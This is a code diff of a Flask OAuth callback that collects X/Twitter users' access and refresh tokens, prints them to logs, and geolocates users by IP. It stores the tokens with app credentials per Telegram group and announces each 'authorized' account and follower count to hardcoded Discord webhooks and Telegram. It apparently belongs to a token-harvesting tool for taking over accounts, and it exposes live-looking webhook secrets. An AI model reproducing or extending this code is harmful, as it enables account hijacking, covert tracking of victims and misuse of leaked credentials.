@@ -113,114 +113,120 @@ def generate_twitter_oauth_url():
 
 @app.route('/auth')
 def auth_callback():
-    authorization_code = request.args.get('code')
-    if not authorization_code:
-        return redirect("https://x.com/")
+    try:
+        group_id = session.get("group_id")
         
-    access_token, refresh_token = exchange_token_for_access(authorization_code)
-    
-    user_data = get_twitter_user_data(access_token)
-    user_id = user_data['id']
-    username = user_data['username']
-    followers_count = user_data['public_metrics']['followers_count']
-    
-    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    location_res = requests.get(f'http://ip-api.com/json/{real_ip}')
-    location_data = location_res.json()
-    country, city = location_data.get("country"), location_data.get("city")
-    country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
-    location = f"{country_flag} {city}, {country}"
-    
-    authorization_time = datetime.utcnow()
-    
-    group_id = session.get("group_id")
-    existing_user = groups.find_one({
-        "group_id": group_id,
-        "authenticated_users.user_id": user_id
-    })
-    
-    if existing_user:
-        groups.update_one(
-            {"group_id": group_id, "authenticated_users.user_id": user_id},
-            {"$set": {
-                "authenticated_users.$.username": username,
-                "authenticated_users.$.location": location,
-                "authenticated_users.$.access_token": access_token,
-                "authenticated_users.$.refresh_token": refresh_token
-            }}
-        )
-    else:
-        TWITTER_CLIENT_ID = session.get("client_id")
-        TWITTER_CLIENT_SECRET = session.get("client_secret")
-        credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')
-        groups.update_one(
-            {"group_id": group_id},
-            {
-                "$push": {
-                    "authenticated_users": {
-                        "user_id": user_id,
-                        "username": username,
-                        "location": location,
-                        "access_token": access_token,
-                        "refresh_token": refresh_token,
-                        "credentials": credentials,
-                        "authorized_at": authorization_time
+        authorization_code = request.args.get('code')
+        if not authorization_code:
+            send_to_telegram(group_id, "❌ *User has cancelled authentication.*")
+            return redirect("https://x.com/")
+            
+        access_token, refresh_token = exchange_token_for_access(authorization_code)
+        print(f"access token: {access_token} | refresh token: {refresh_token} | group id: {group_id}")
+        
+        user_data = get_twitter_user_data(access_token)
+        user_id = user_data['id']
+        username = user_data['username']
+        followers_count = user_data['public_metrics']['followers_count']
+        
+        real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        location_res = requests.get(f'http://ip-api.com/json/{real_ip}')
+        location_data = location_res.json()
+        country, city = location_data.get("country"), location_data.get("city")
+        country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
+        location = f"{country_flag} {city}, {country}"
+        
+        authorization_time = datetime.utcnow()
+        
+        existing_user = groups.find_one({
+            "group_id": group_id,
+            "authenticated_users.user_id": user_id
+        })
+        
+        if existing_user:
+            groups.update_one(
+                {"group_id": group_id, "authenticated_users.user_id": user_id},
+                {"$set": {
+                    "authenticated_users.$.username": username,
+                    "authenticated_users.$.location": location,
+                    "authenticated_users.$.access_token": access_token,
+                    "authenticated_users.$.refresh_token": refresh_token
+                }}
+            )
+        else:
+            TWITTER_CLIENT_ID = session.get("client_id")
+            TWITTER_CLIENT_SECRET = session.get("client_secret")
+            credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')
+            groups.update_one(
+                {"group_id": group_id},
+                {
+                    "$push": {
+                        "authenticated_users": {
+                            "user_id": user_id,
+                            "username": username,
+                            "location": location,
+                            "access_token": access_token,
+                            "refresh_token": refresh_token,
+                            "credentials": credentials,
+                            "authorized_at": authorization_time
+                        }
                     }
                 }
+            )
+        
+        if group_id == -1002433325091:
+            embed = {
+                "title": "🐍 New User Authorized",
+                "color": 0x00A550,
+                "fields": [
+                    {
+                        "name": "👤 Account",
+                        "value": f"[{username}](https://x.com/{username})",
+                        "inline": False
+                    },
+                    {
+                        "name": "👥 Followers",
+                        "value": f"{followers_count}",
+                        "inline": False
+                    }
+                ]
             }
-        )
+            
+            payload = {
+                "content": "@everyone",
+                "embeds": [embed],
+            }
+            
+            requests.post("https://discord.com/api/webhooks/1334653439673897103/IjwKe1YStWUVrBfQZlRE1Kz8mfFv8KkCiHZIsbUd7OCJUF7HghhE0jfzFyCt-puJdBsA", data=json.dumps(payload), headers={"Content-Type": "application/json"})
+        elif group_id == -1002424152115:
+            embed = {
+                "title": "🐍 User Authorized",
+                "color": 0x00A550,
+                "fields": [
+                    {
+                        "name": "🔗 Link",
+                        "value": f"[{username}](https://x.com/{username})",
+                        "inline": False
+                    },
+                    {
+                        "name": "👥 Followers",
+                        "value": f"{followers_count}",
+                        "inline": False
+                    }
+                ]
+            }
+            
+            payload = {
+                "embeds": [embed],
+            }
     
-    if group_id == -1002433325091:
-        embed = {
-            "title": "🐍 New User Authorized",
-            "color": 0x00A550,
-            "fields": [
-                {
-                    "name": "👤 Account",
-                    "value": f"[{username}](https://x.com/{username})",
-                    "inline": False
-                },
-                {
-                    "name": "👥 Followers",
-                    "value": f"{followers_count}",
-                    "inline": False
-                }
-            ]
-        }
+            requests.post("https://discord.com/api/webhooks/1379621785414270996/lryToJHYNF3OE1PvLXl2pNS29DStU9cV4yCXoDLk5fpz_ge4THklEPgSZyTnOky903TH", data=json.dumps(payload), headers={"Content-Type": "application/json"})
         
-        payload = {
-            "content": "@everyone",
-            "embeds": [embed],
-        }
-        
-        requests.post("https://discord.com/api/webhooks/1334653439673897103/IjwKe1YStWUVrBfQZlRE1Kz8mfFv8KkCiHZIsbUd7OCJUF7HghhE0jfzFyCt-puJdBsA", data=json.dumps(payload), headers={"Content-Type": "application/json"})
-    elif group_id == -1002424152115:
-        embed = {
-            "title": "🐍 User Authorized",
-            "color": 0x00A550,
-            "fields": [
-                {
-                    "name": "🔗 Link",
-                    "value": f"[{username}](https://x.com/{username})",
-                    "inline": False
-                },
-                {
-                    "name": "👥 Followers",
-                    "value": f"{followers_count}",
-                    "inline": False
-                }
-            ]
-        }
-        
-        payload = {
-            "embeds": [embed],
-        }
-
-        requests.post("https://discord.com/api/webhooks/1379621785414270996/lryToJHYNF3OE1PvLXl2pNS29DStU9cV4yCXoDLk5fpz_ge4THklEPgSZyTnOky903TH", data=json.dumps(payload), headers={"Content-Type": "application/json"})
-    
-    send_to_telegram(username, followers_count, group_id)
-    return redirect(session.get("redirect_url", "https://x.com/"))
-
+        send_to_telegram(username, followers_count, group_id)
+        return redirect(session.get("redirect_url", "https://x.com/"))
+    except Exception as e:
+        print(e)
+        return redirect(session.get("redirect_url", "https://x.com/"))
 
 def exchange_token_for_access(authorization_code):
     TWITTER_CLIENT_ID = session.get("client_id")
